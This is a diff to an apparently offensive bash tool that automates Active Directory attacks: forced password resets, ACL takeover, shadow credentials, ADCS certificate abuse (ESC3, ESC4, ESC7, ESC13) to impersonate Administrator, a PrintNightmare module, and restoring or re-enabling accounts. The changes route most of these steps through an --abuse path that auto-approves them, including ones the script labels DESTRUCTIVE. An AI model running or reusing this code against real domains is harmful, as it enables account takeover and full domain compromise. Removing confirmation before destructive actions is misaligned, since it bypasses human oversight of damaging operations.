@@ -276,9 +276,9 @@ confirm() {
 }
 
 abuse_confirm() {
-    local msg="$1" destructive="${2:-0}"
+    local msg="$1"
     [[ "$AUTO_YES" == "1" ]] && return 0
-    if [[ "$DO_ABUSE" == "1" && "$destructive" != "1" ]]; then
+    if [[ "$DO_ABUSE" == "1" ]]; then
         info "${msg} → auto (--abuse)"
         return 0
     fi
@@ -765,7 +765,7 @@ _change_expired_password() {
     local tool; tool=$(command -v changepasswd.py || command -v impacket-changepasswd) || return 1
     local newpw="$PIVOT_PW" host="${DC_FQDN:-$DC_IP}"
     warn "Password for '${USER}' is EXPIRED / must change — resetting via kpasswd to regain access"
-    confirm "  Set a new password for '${USER}' (expired anyway) and continue as them?" || return 1
+    abuse_confirm "  Set a new password for '${USER}' (expired anyway) and continue as them?" || return 1
     run "$tool $DOMAIN/$USER:***@$host -newpass *** -p kpasswd -dc-ip $DC_IP"
     if "$tool" "$DOMAIN/$USER:$PASS@$host" -newpass "$newpw" -p kpasswd -dc-ip "$DC_IP" 2>&1 \
          | tee -a "$LOGFILE" | grep -qiE 'changed successfully|password was changed|success'; then
@@ -1228,7 +1228,14 @@ phase_cve_checks() {
     done
 
     if [[ "$DEEP_CVE" != "1" && "$STEALTH" != "1" ]]; then
-        info "Skipping slow PrintNightmare module in fast mode (use --deep-cve to run it)"
+        if grep -qiE 'spooler.*(enabled|running)|print spooler.*(enabled|running)|coerce.*(vulnerable|success)|VULNERABLE' "$out" 2>/dev/null \
+           && nxc_has_module smb printnightmare; then
+            subsection "NetExec module: printnightmare (triggered by spooler/coercion signal)"
+            run "$NXC smb $DCT ${args[*]} -M printnightmare"
+            $NXC smb "$DCT" "${args[@]}" -M printnightmare 2>&1 | tee -a "$LOGFILE" | tee -a "$out"
+        else
+            info "Skipping slow PrintNightmare module in fast mode (no spooler/coercion signal; use --deep-cve to force it)"
+        fi
     fi
 
     if grep -qiE 'VULNERABLE|is vulnerable|Success|CVE-|Zerologon|PrintNightmare|Spooler service enabled' "$out" 2>/dev/null; then
@@ -1312,8 +1319,8 @@ phase_adcs() {
     # 52e/57'), and most labs keep NTLM enabled — PREFER password/hash + -target;
     # fall back to Kerberos only when that's all we have or NTLM is refused.
     local cbase=(-u "${USER}@${DOMAIN}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}") cauth=() cenv=() cout
-    if   [[ -n "$PASS" ]]; then cauth=(-p "$PASS")
-    elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH")
+    if   [[ -n "$PASS" ]]; then cauth=(-p "$PASS"); cenv=(env -u KRB5CCNAME)
+    elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH"); cenv=(env -u KRB5CCNAME)
     elif [[ -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET"); fi
     run "certipy find ${cbase[*]} ${cauth[*]} -stdout -vulnerable"
     cout=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
@@ -2088,7 +2095,7 @@ _abuse_group() {
 _abuse_user() {
     local target="$1"; local ba; mapfile -t ba < <(bloody_args)
     [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; run with --abuse to reset '$target' password)"; return; }
-    confirm "  Force-reset password of '${target}' (DESTRUCTIVE — original unknown)?" || return
+    abuse_confirm "  Force-reset password of '${target}' (DESTRUCTIVE — original unknown)?" || return
     run "bloodyAD ${ba[*]} set password '$target' '$PIVOT_PW'"
     if bloodyAD "${ba[@]}" set password "$target" "$PIVOT_PW" 2>&1 | tee -a "$LOGFILE" | grep -qi 'success\|changed'; then
         loot "★ Password of '${target}' reset → pivoting as that user"
@@ -2109,7 +2116,7 @@ _abuse_user() {
 _abuse_acl_takeover() {
     local target="$1"; local ba; mapfile -t ba < <(bloody_args)
     [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to take over ACL of '$target' → GenericAll → reset)"; return 1; }
-    confirm "  Take over '${target}' (set owner if needed, grant ${USER} GenericAll, then reset)?" || return 1
+    abuse_confirm "  Take over '${target}' (set owner if needed, grant ${USER} GenericAll, then reset)?" || return 1
     # 1) Try to grant ourselves GenericAll directly (works if we hold WriteDACL or
     #    already own the object). If that's refused, take ownership first.
     if ! bloodyAD "${ba[@]}" add genericAll "$target" "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|granted|added|modif|written'; then
@@ -2148,8 +2155,8 @@ _abuse_shadowcred() {
     # Prefer password/hash (certipy Kerberos is flaky); -target/-dc-host + ccache
     # only as fallback. Mirrors phase_adcs so shadow works on NTLM-on labs too.
     local cbase=(-u "${USER}@${DOMAIN}" -account "$target" -dc-ip "$DC_IP" -ns "$DC_IP" -target "${DC_FQDN:-$DCT}") cauth=() cenv=()
-    if   [[ -n "$PASS" ]]; then cauth=(-p "$PASS")
-    elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH")
+    if   [[ -n "$PASS" ]]; then cauth=(-p "$PASS"); cenv=(env -u KRB5CCNAME)
+    elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH"); cenv=(env -u KRB5CCNAME)
     elif [[ -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET"); fi
     run "certipy shadow auto ${cbase[*]} ${cauth[*]}"
     local out; out=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
@@ -2268,8 +2275,8 @@ _abuse_dcsync_dacl() {
 _ADCS_AUTH=(); _ADCS_ENV=()
 _adcs_setauth() {                       # build certipy auth args for the current cred
     _ADCS_AUTH=(-u "${USER}@${DOMAIN}"); _ADCS_ENV=()
-    if   [[ -n "$PASS" ]]; then _ADCS_AUTH+=(-p "$PASS")
-    elif [[ -n "$HASH" ]]; then _ADCS_AUTH+=(-hashes ":$HASH")
+    if   [[ -n "$PASS" ]]; then _ADCS_AUTH+=(-p "$PASS"); _ADCS_ENV=(env -u KRB5CCNAME)
+    elif [[ -n "$HASH" ]]; then _ADCS_AUTH+=(-hashes ":$HASH"); _ADCS_ENV=(env -u KRB5CCNAME)
     elif [[ -n "$KERB_TICKET" ]]; then _ADCS_AUTH+=(-k -no-pass); _ADCS_ENV=(env "KRB5CCNAME=$KERB_TICKET"); fi
 }
 _adcs_template_for() {                  # template name certipy tied to a given ESC tag
@@ -2314,7 +2321,7 @@ _adcs_pwn_pfx() {                       # _adcs_pwn_pfx <pfx-basename> <label> [
 _adcs_req_admin() {                     # _adcs_req_admin <ca> <tpl> <label> <with_sid> [extra…]
     local ca="$1" tpl="$2" label="$3" with_sid="$4"; shift 4
     _adcs_setauth
-    confirm "  ${label}: request a cert as Administrator via '$tpl' on CA '$ca'?" || return 1
+    abuse_confirm "  ${label}: request a cert as Administrator via '$tpl' on CA '$ca'?" || return 1
     local sidargs=(); [[ "$with_sid" == "1" && -n "$_ADCS_SID" ]] && sidargs=(-sid "$_ADCS_SID")
     local rargs=(req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" -upn "administrator@${DOMAIN}" \
                  "${sidargs[@]}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" "$@")
@@ -2331,7 +2338,7 @@ _adcs_req_admin() {                     # _adcs_req_admin <ca> <tpl> <label> <wi
 # ESC3 — Enrollment Agent: get an agent cert, then request On-Behalf-Of Administrator.
 _adcs_esc3() {
     local ca="$1" agenttpl="$2"; _adcs_setauth
-    confirm "  ESC3: use Enrollment Agent template '$agenttpl' to enrol on behalf of Administrator?" || return 1
+    abuse_confirm "  ESC3: use Enrollment Agent template '$agenttpl' to enrol on behalf of Administrator?" || return 1
     local o1; o1=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$agenttpl" \
         -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" </dev/null 2>&1 ); echo "$o1" | tee -a "$LOGFILE"
     local agent; agent=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$o1" | tail -1 | xargs -r basename)
@@ -2345,7 +2352,7 @@ _adcs_esc3() {
 # ESC4 — writable template ACL: push an ESC1-vulnerable config, exploit, then restore.
 _adcs_esc4() {
     local ca="$1" tpl="$2"; _adcs_setauth
-    confirm "  ESC4: reconfigure template '$tpl' to be vulnerable, exploit, then restore?" || return 1
+    abuse_confirm "  ESC4: reconfigure template '$tpl' to be vulnerable, exploit, then restore?" || return 1
     ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy template "${_ADCS_AUTH[@]}" -template "$tpl" \
         -write-default-configuration -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
     rb_record "ESC4: overwrote template $tpl config" \
@@ -2359,7 +2366,7 @@ _adcs_esc4() {
 # ESC7 — ManageCA/ManageCertificates: enable SubCA, request (pending), self-issue, retrieve.
 _adcs_esc7() {
     local ca="$1"; _adcs_setauth
-    confirm "  ESC7: add self as CA officer, enable SubCA, issue a request as Administrator?" || return 1
+    abuse_confirm "  ESC7: add self as CA officer, enable SubCA, issue a request as Administrator?" || return 1
     ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -add-officer "$USER" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
     rb_record "ESC7: added $USER as officer on CA $ca" "certipy ca -ca '$ca' -remove-officer '$USER' -dc-ip '$DC_IP'"
     ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -enable-template SubCA -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
@@ -2376,7 +2383,7 @@ _adcs_esc7() {
 # ESC13 — issuance policy linked to a group: enrol, auth → TGT carries that group.
 _adcs_esc13() {
     local ca="$1" tpl="$2"; _adcs_setauth
-    confirm "  ESC13: enrol template '$tpl' to inherit its linked (privileged) group?" || return 1
+    abuse_confirm "  ESC13: enrol template '$tpl' to inherit its linked (privileged) group?" || return 1
     local out; out=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" \
         -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" </dev/null 2>&1 ); echo "$out" | tee -a "$LOGFILE"
     local pfx; pfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$out" | tail -1 | xargs -r basename)
@@ -2437,7 +2444,7 @@ _adcs_restore_enroller() {   # _adcs_restore_enroller <space-separated SIDs>
             detail "      bloodyAD ${ba[*]} set password '$sam' '$PIVOT_PW'   # then re-run ESC15 as $sam"
             continue
         fi
-        confirm "  Restore deleted enroller '${sam}' (SID ${sid}) from the Recycle Bin?" || continue
+        abuse_confirm "  Restore deleted enroller '${sam}' (SID ${sid}) from the Recycle Bin?" || continue
         local rout; rout=$(bloodyAD "${ba[@]}" set restore "$dn" 2>&1); echo "$rout" | tee -a "$LOGFILE"
         if grep -qiE 'restored|success' <<<"$rout"; then
             rb_record "Restored ADCS enroller $sam ($sid)" "echo 'Manual: re-delete $sam if the client needs it'"
@@ -2653,7 +2660,7 @@ phase_recycle_disabled() {
         echo "$dis" >"$OUTDIR/disabled_accounts.txt"
         if [[ "$DO_ABUSE" == "1" ]]; then
             echo "$dis" | while read -r u; do
-                confirm "  Re-enable disabled account '$u'?" || continue
+                abuse_confirm "  Re-enable disabled account '$u'?" || continue
                 if bloodyAD "${ba[@]}" remove uac "$u" -f ACCOUNTDISABLE 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|removed|modif'; then
                     loot "★ Re-enabled '$u' → added to spray pool"
                     rb_record "Re-enabled account $u" "bloodyAD ${ba[*]} add uac '$u' -f ACCOUNTDISABLE"
@@ -2714,7 +2721,7 @@ phase_recycle_disabled() {
             while IFS=$'\t' read -r dn sam; do
                 [[ -z "$dn" ]] && continue
                 local name="${sam:-$(echo "$dn" | grep -oiP '^CN=\K[^\\]+')}"
-                confirm "  Restore deleted account '$name'?" || continue
+                abuse_confirm "  Restore deleted account '$name'?" || continue
                 if bloodyAD "${ba[@]}" set restore "$dn" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'restored|success'; then
                     loot "★ Restored '$name' — re-enabling & taking it over"
                     rb_record "Restored deleted object $name" "echo 'Manual: re-delete $name if required by client'"
